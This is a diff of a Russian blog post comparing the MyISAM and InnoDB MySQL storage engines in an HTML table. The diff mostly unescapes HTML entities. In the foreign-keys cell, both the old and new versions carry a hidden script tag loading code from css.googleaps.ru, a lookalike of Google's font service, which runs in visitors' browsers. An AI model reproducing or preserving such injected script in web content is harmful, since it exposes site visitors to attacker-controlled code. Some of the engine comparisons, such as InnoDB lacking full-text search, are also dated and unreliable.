@@ -25,104 +25,104 @@ tags:
 - myisam
 comments: []
 ---
-<p>Отличия между системами хранения данных MyISAM и InnoDB простым языком на простых примерах:<&#47;p><span id="more-512"><&#47;span></p>
+<p>Отличия между системами хранения данных MyISAM и InnoDB простым языком на простых примерах:</p><span id="more-512"></span></p>
 <table class="table table-bordered" border="1" width="100%" cellspacing="0" cellpadding="0">
 <tbody>
 <tr>
-<td width="65%"><&#47;td></p>
-<td style="text-align: center;" width="15%"><strong>MyISAM<&#47;strong><&#47;td></p>
-<td style="text-align: center;" width="20%"><strong>InnoDB<&#47;strong><&#47;td><br />
-<&#47;tr></p>
+<td width="65%"></td></p>
+<td style="text-align: center;" width="15%"><strong>MyISAM</strong></td></p>
+<td style="text-align: center;" width="20%"><strong>InnoDB</strong></td><br />
+</tr></p>
 <tr>
 <td>
-<p><strong>Транзакционный движек?<&#47;strong><&#47;p>Транзакция (Transaction) &ndash; блок операторов SQL , который в случае ошибки в одном запросе, возвращается к предыдущему состоянию (Rollback), и только в случае выполнения всех запросов подтверждается (Commit)<&#47;td></p>
-<td style="text-align: center;">Нет<&#47;td></p>
-<td style="text-align: center;">Да<&#47;td><br />
-<&#47;tr></p>
+<p><strong>Транзакционный движек?</strong></p>Транзакция (Transaction) &ndash; блок операторов SQL , который в случае ошибки в одном запросе, возвращается к предыдущему состоянию (Rollback), и только в случае выполнения всех запросов подтверждается (Commit)</td></p>
+<td style="text-align: center;">Нет</td></p>
+<td style="text-align: center;">Да</td><br />
+</tr></p>
 <tr>
 <td>
-<p><strong>Поддержка внешних ключей<&#47;strong><&#47;p>Внешние ключи &ndash; это способ связать записи в двух таблицах по определенным полям так, что при обновлении поля в родительской автоматически происходит определенное изменение поля в дочерней (дочернюю и родительскую выбираешь при создании ключа; точнее, создаешь ключ в дочерней, который ссылается на родительскую).<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;td></p>
-<td style="text-align: center;">Нет<&#47;td></p>
-<td style="text-align: center;">Да<&#47;td><br />
-<&#47;tr></p>
+<p><strong>Поддержка внешних ключей</strong></p>Внешние ключи &ndash; это способ связать записи в двух таблицах по определенным полям так, что при обновлении поля в родительской автоматически происходит определенное изменение поля в дочерней (дочернюю и родительскую выбираешь при создании ключа; точнее, создаешь ключ в дочерней, который ссылается на родительскую).<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></td></p>
+<td style="text-align: center;">Нет</td></p>
+<td style="text-align: center;">Да</td><br />
+</tr></p>
 <tr>
 <td>
-<p><strong>Блокировка.<&#47;strong><&#47;p>Блокировка на уровне строк, т.е. если процессу нужно обновить строку в таблице, то он блокирует только эту строку, позволяя другим обновлять другие строки параллельно<&#47;td></p>
-<td style="text-align: center;">Блокировка на уровне таблиц<&#47;td></p>
-<td style="text-align: center;">Блокировка на уровне строк<&#47;td><br />
-<&#47;tr></p>
+<p><strong>Блокировка.</strong></p>Блокировка на уровне строк, т.е. если процессу нужно обновить строку в таблице, то он блокирует только эту строку, позволяя другим обновлять другие строки параллельно</td></p>
+<td style="text-align: center;">Блокировка на уровне таблиц</td></p>
+<td style="text-align: center;">Блокировка на уровне строк</td><br />
+</tr></p>
 <tr>
-<td><strong>Одновременные запросы к разным частям таблицы.<&#47;strong><&#47;td></p>
-<td style="text-align: center;">Медленнее<&#47;td></p>
-<td style="text-align: center;">Быстрее<&#47;td><br />
-<&#47;tr></p>
+<td><strong>Одновременные запросы к разным частям таблицы.</strong></td></p>
+<td style="text-align: center;">Медленнее</td></p>
+<td style="text-align: center;">Быстрее</td><br />
+</tr></p>
 <tr>
-<td><strong>При смешанной нагрузке в таблице (select&#47;update&#47;delete&#47;insert)<&#47;strong><&#47;td></p>
-<td style="text-align: center;">Медленнее<&#47;td></p>
-<td style="text-align: center;">Быстрее<&#47;td><br />
-<&#47;tr></p>
+<td><strong>При смешанной нагрузке в таблице (select/update/delete/insert)</strong></td></p>
+<td style="text-align: center;">Медленнее</td></p>
+<td style="text-align: center;">Быстрее</td><br />
+</tr></p>
 <tr>
-<td><strong>Операция Insert<&#47;strong><&#47;td></p>
-<td style="text-align: center;">Быстрее<&#47;td></p>
-<td style="text-align: center;">Медленнее, ибо есть оверхед на транзакцию, но это цена надежности<&#47;td><br />
-<&#47;tr></p>
+<td><strong>Операция Insert</strong></td></p>
+<td style="text-align: center;">Быстрее</td></p>
+<td style="text-align: center;">Медленнее, ибо есть оверхед на транзакцию, но это цена надежности</td><br />
+</tr></p>
 <tr>
-<td><strong>Если преобладают операции чтения (SELECT)<&#47;strong><&#47;td></p>
-<td style="text-align: center;">Работает быстрее<&#47;td></p>
-<td style="text-align: center;">Работает медленнее<&#47;td><br />
-<&#47;tr></p>
-<tr>
-<td>
-<p><strong>Deadlock<&#47;strong><&#47;p>Deadlock &mdash; ситуация в многозадачной среде или СУБД, при которой несколько процессов находятся в состоянии бесконечного ожидания ресурсов, захваченных самими этими процессами.<&#47;td></p>
-<td style="text-align: center;">Не возникают<&#47;td></p>
-<td style="text-align: center;">Возможны.<&#47;td><br />
-<&#47;tr></p>
-<tr>
-<td><strong>Поддержка полнотекстового поиска<&#47;strong><&#47;td></p>
-<td style="text-align: center;">Да<&#47;td></p>
-<td style="text-align: center;">Нет<&#47;td><br />
-<&#47;tr></p>
-<tr>
-<td><strong>Запрос Count(*)<&#47;strong><&#47;td></p>
-<td style="text-align: center;">Быстрее<&#47;td></p>
-<td style="text-align: center;">Медленнее<&#47;td><br />
-<&#47;tr></p>
+<td><strong>Если преобладают операции чтения (SELECT)</strong></td></p>
+<td style="text-align: center;">Работает быстрее</td></p>
+<td style="text-align: center;">Работает медленнее</td><br />
+</tr></p>
 <tr>
 <td>
-<p><strong>Поддержка mysqlhotcopy<&#47;strong><&#47;p>Утилита mysqlhotcopy представляет собой Perl-сценарий, использующий SQL-команды LOCK TABLES, FLUSH TABLES и Unix-утилиты cp или scp для быстрого получения резервной копии базы данных.<&#47;td></p>
-<td style="text-align: center;">Да<&#47;td></p>
-<td style="text-align: center;">Нет<&#47;td><br />
-<&#47;tr></p>
+<p><strong>Deadlock</strong></p>Deadlock &mdash; ситуация в многозадачной среде или СУБД, при которой несколько процессов находятся в состоянии бесконечного ожидания ресурсов, захваченных самими этими процессами.</td></p>
+<td style="text-align: center;">Не возникают</td></p>
+<td style="text-align: center;">Возможны.</td><br />
+</tr></p>
 <tr>
-<td><strong>Файловое хранение таблиц<&#47;strong><&#47;td></p>
-<td style="text-align: center;">Каждой таблице отдельный файл<&#47;td></p>
-<td style="text-align: center;">Данные при настройках по умолчанию хранятся в больших совместно используемых файлах<&#47;td><br />
-<&#47;tr></p>
+<td><strong>Поддержка полнотекстового поиска</strong></td></p>
+<td style="text-align: center;">Да</td></p>
+<td style="text-align: center;">Нет</td><br />
+</tr></p>
+<tr>
+<td><strong>Запрос Count(*)</strong></td></p>
+<td style="text-align: center;">Быстрее</td></p>
+<td style="text-align: center;">Медленнее</td><br />
+</tr></p>
 <tr>
 <td>
-<p><strong>Бинарное копировании таблиц?<&#47;strong><&#47;p>Табличные файлы можно перемещать между компьютерами разных архитектур и разными операционными системами без всякого преобразования.<&#47;td></p>
-<td style="text-align: center;">Да<&#47;td></p>
-<td style="text-align: center;">Нет<&#47;td><br />
-<&#47;tr></p>
+<p><strong>Поддержка mysqlhotcopy</strong></p>Утилита mysqlhotcopy представляет собой Perl-сценарий, использующий SQL-команды LOCK TABLES, FLUSH TABLES и Unix-утилиты cp или scp для быстрого получения резервной копии базы данных.</td></p>
+<td style="text-align: center;">Да</td></p>
+<td style="text-align: center;">Нет</td><br />
+</tr></p>
 <tr>
-<td><strong>Размер таблиц в БД<&#47;strong><&#47;td></p>
-<td style="text-align: center;">Меньше<&#47;td></p>
-<td style="text-align: center;">Больше<&#47;td><br />
-<&#47;tr></p>
+<td><strong>Файловое хранение таблиц</strong></td></p>
+<td style="text-align: center;">Каждой таблице отдельный файл</td></p>
+<td style="text-align: center;">Данные при настройках по умолчанию хранятся в больших совместно используемых файлах</td><br />
+</tr></p>
 <tr>
-<td><strong>Поведение в случае сбоя<&#47;strong><&#47;td></p>
-<td style="text-align: center;">Крашится вся таблица<&#47;td></p>
-<td style="text-align: center;">По логам можно все восстановить<&#47;td><br />
-<&#47;tr></p>
+<td>
+<p><strong>Бинарное копировании таблиц?</strong></p>Табличные файлы можно перемещать между компьютерами разных архитектур и разными операционными системами без всякого преобразования.</td></p>
+<td style="text-align: center;">Да</td></p>
+<td style="text-align: center;">Нет</td><br />
+</tr></p>
 <tr>
-<td><strong>В случае хранения &laquo;логов&raquo; и подобного<&#47;strong><&#47;td></p>
-<td style="text-align: center;">Лучше<&#47;td></p>
-<td style="text-align: center;">Хуже<&#47;td><br />
-<&#47;tr><br />
-<&#47;tbody><br />
-<&#47;table><br />
-<strong> Выводы:<&#47;strong></p>
+<td><strong>Размер таблиц в БД</strong></td></p>
+<td style="text-align: center;">Меньше</td></p>
+<td style="text-align: center;">Больше</td><br />
+</tr></p>
+<tr>
+<td><strong>Поведение в случае сбоя</strong></td></p>
+<td style="text-align: center;">Крашится вся таблица</td></p>
+<td style="text-align: center;">По логам можно все восстановить</td><br />
+</tr></p>
+<tr>
+<td><strong>В случае хранения &laquo;логов&raquo; и подобного</strong></td></p>
+<td style="text-align: center;">Лучше</td></p>
+<td style="text-align: center;">Хуже</td><br />
+</tr><br />
+</tbody><br />
+</table><br />
+<strong> Выводы:</strong></p>
 <ul>
-<li>Использовать MyISAM лучше в таблицах, которых преобладает один вид доступа: чтение (новостной сайт) или запись (например, логирование) ;<&#47;li>
-<li>Использование&nbsp;InnoDB имеет смысл во всех остальных случаях и случаях повышенных требований по сохранности данных.<&#47;li><br />
-<&#47;ul></p>
+<li>Использовать MyISAM лучше в таблицах, которых преобладает один вид доступа: чтение (новостной сайт) или запись (например, логирование) ;</li>
+<li>Использование&nbsp;InnoDB имеет смысл во всех остальных случаях и случаях повышенных требований по сохранности данных.</li><br />
+</ul></p>
